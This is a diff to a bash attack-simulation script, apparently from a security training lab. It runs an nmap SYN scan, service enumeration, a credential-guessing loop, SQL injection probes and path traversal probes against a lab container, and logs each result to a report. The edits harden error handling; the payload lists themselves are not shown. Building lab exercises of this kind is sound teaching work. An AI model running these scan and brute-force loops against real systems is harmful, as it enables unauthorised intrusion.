@@ -26,7 +26,7 @@ secure_learn_validate_target
 TARGET="${TARGET:-app}"
 TARGET_IP="${TARGET_IP:-172.23.0.20}"
 TARGET_PORT="${TARGET_PORT:-3000}"
-OUTPUT_DIR="/results"
+OUTPUT_DIR="${OUTPUT_DIR:-/results}"
 DELAY="${DELAY:-5}"
 
 secure_learn_validate_bounded_decimal DELAY "$DELAY" 0 10
@@ -71,13 +71,18 @@ echo "### Phase 1: Reconnaissance" >> "$REPORT_FILE"
 echo "**Time**: $(date -Iseconds)" >> "$REPORT_FILE"
 echo "" >> "$REPORT_FILE"
 
-# Quick port scan
-nmap -sS -p 22,80,3000,5432,9200 --open "$TARGET_IP" 2>/dev/null | tee -a "$REPORT_FILE"
-scan_exit=$?
+# A denied SYN scan is still useful evidence. Keep pipefail enabled while using
+# an if-condition so a non-zero nmap status is recorded instead of terminating
+# the remaining bounded phases.
+if nmap -sS -p 22,80,3000,5432,9200 --open "$TARGET_IP" 2>/dev/null | tee -a "$REPORT_FILE"; then
+    scan_exit=0
+else
+    scan_exit=$?
+fi
 
 echo ""
-echo "Scan command exited with status $scan_exit; inspect its output before drawing conclusions."
-echo "**Command exit**: $scan_exit (inspect captured output)" >> "$REPORT_FILE"
+echo "Scan command exit status: $scan_exit; inspect its output before drawing conclusions."
+echo "**Command exit status**: $scan_exit (inspect captured output)" >> "$REPORT_FILE"
 echo "Waiting ${DELAY}s before next phase..."
 sleep "$DELAY"
 
@@ -92,8 +97,15 @@ echo "### Phase 2: Service Enumeration" >> "$REPORT_FILE"
 echo "**Time**: $(date -Iseconds)" >> "$REPORT_FILE"
 echo "" >> "$REPORT_FILE"
 
-# Check what service is running
-curl -s -I -H "Host: $TARGET" "http://$TARGET_IP:$TARGET_PORT/" 2>/dev/null | head -10 | tee -a "$REPORT_FILE"
+# Check what service is running. Network failures are observations, not reasons
+# to lose later phases from the incident timeline.
+if service_headers=$(curl -s -I -H "Host: $TARGET" "http://$TARGET_IP:$TARGET_PORT/" 2>/dev/null); then
+    service_exit=0
+else
+    service_exit=$?
+fi
+printf '%s\n' "$service_headers" | head -10 | tee -a "$REPORT_FILE" || true
+echo "**Command exit**: $service_exit" >> "$REPORT_FILE"
 
 echo ""
 echo "Waiting ${DELAY}s before next phase..."
@@ -125,16 +137,22 @@ for cred in "${credentials[@]}"; do
     user="${cred%%:*}"
     pass="${cred#*:}"
     
-    response=$(curl -s -X POST "http://$TARGET_IP:$TARGET_PORT/auth/login" \
+    if response=$(curl -s -X POST "http://$TARGET_IP:$TARGET_PORT/auth/login" \
         -H "Host: $TARGET" \
         -H "Content-Type: application/json" \
         -d "{\"username\":\"$user\",\"password\":\"$pass\"}" \
-        -w "\nHTTP_CODE:%{http_code}")
+        -w "\nHTTP_CODE:%{http_code}"); then
+        request_exit=0
+    else
+        request_exit=$?
+    fi
+    http_code="${response##*HTTP_CODE:}"
+    if [[ "$http_code" == "$response" || ! "$http_code" =~ ^[0-9]{3}$ ]]; then
+        http_code="unavailable"
+    fi
     
-    http_code=$(echo "$response" | grep "HTTP_CODE:" | cut -d: -f2)
-    
-    echo "Auth attempt $attempt_number - HTTP $http_code"
-    echo "- Attempt $attempt_number - HTTP $http_code" >> "$REPORT_FILE"
+    echo "Auth attempt $attempt_number - HTTP $http_code (curl exit $request_exit)"
+    echo "- Attempt $attempt_number - HTTP $http_code (curl exit $request_exit)" >> "$REPORT_FILE"
     
     if [ "$http_code" = "200" ]; then
         echo "  HTTP 200 observed; input values withheld"
@@ -167,16 +185,26 @@ sqli_payloads=(
 )
 
 for payload in "${sqli_payloads[@]}"; do
-    encoded=$(echo -n "$payload" | jq -sRr @uri)
+    if ! encoded=$(printf '%s' "$payload" | jq -sRr @uri); then
+        echo "Skipping SQLi request: payload encoding failed"
+        echo "- Payload encoding failed; request skipped" >> "$REPORT_FILE"
+        continue
+    fi
     echo "Trying SQLi: $payload"
     echo "- Payload: \`$payload\`" >> "$REPORT_FILE"
     
-    response=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
-        -H "Host: $TARGET" "http://$TARGET_IP:$TARGET_PORT/users?id=$encoded" 2>/dev/null)
-    
-    http_code=$(echo "$response" | grep "HTTP_CODE:" | cut -d: -f2)
-    echo "  Response: HTTP $http_code"
-    echo "  - Response: HTTP $http_code" >> "$REPORT_FILE"
+    if response=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
+        -H "Host: $TARGET" "http://$TARGET_IP:$TARGET_PORT/users?id=$encoded" 2>/dev/null); then
+        request_exit=0
+    else
+        request_exit=$?
+    fi
+    http_code="${response##*HTTP_CODE:}"
+    if [[ "$http_code" == "$response" || ! "$http_code" =~ ^[0-9]{3}$ ]]; then
+        http_code="unavailable"
+    fi
+    echo "  Response: HTTP $http_code (curl exit $request_exit)"
+    echo "  - Response: HTTP $http_code (curl exit $request_exit)" >> "$REPORT_FILE"
 done
 
 echo ""
@@ -205,12 +233,18 @@ for payload in "${traversal_payloads[@]}"; do
     echo "Trying: $payload"
     echo "- Payload: \`$payload\`" >> "$REPORT_FILE"
     
-    response=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
-        -H "Host: $TARGET" "http://$TARGET_IP:$TARGET_PORT/files/$payload" 2>/dev/null)
-    
-    http_code=$(echo "$response" | grep "HTTP_CODE:" | cut -d: -f2)
-    echo "  Response: HTTP $http_code"
-    echo "  - Response: HTTP $http_code" >> "$REPORT_FILE"
+    if response=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
+        -H "Host: $TARGET" "http://$TARGET_IP:$TARGET_PORT/files/$payload" 2>/dev/null); then
+        request_exit=0
+    else
+        request_exit=$?
+    fi
+    http_code="${response##*HTTP_CODE:}"
+    if [[ "$http_code" == "$response" || ! "$http_code" =~ ^[0-9]{3}$ ]]; then
+        http_code="unavailable"
+    fi
+    echo "  Response: HTTP $http_code (curl exit $request_exit)"
+    echo "  - Response: HTTP $http_code (curl exit $request_exit)" >> "$REPORT_FILE"
 done
 
 echo ""
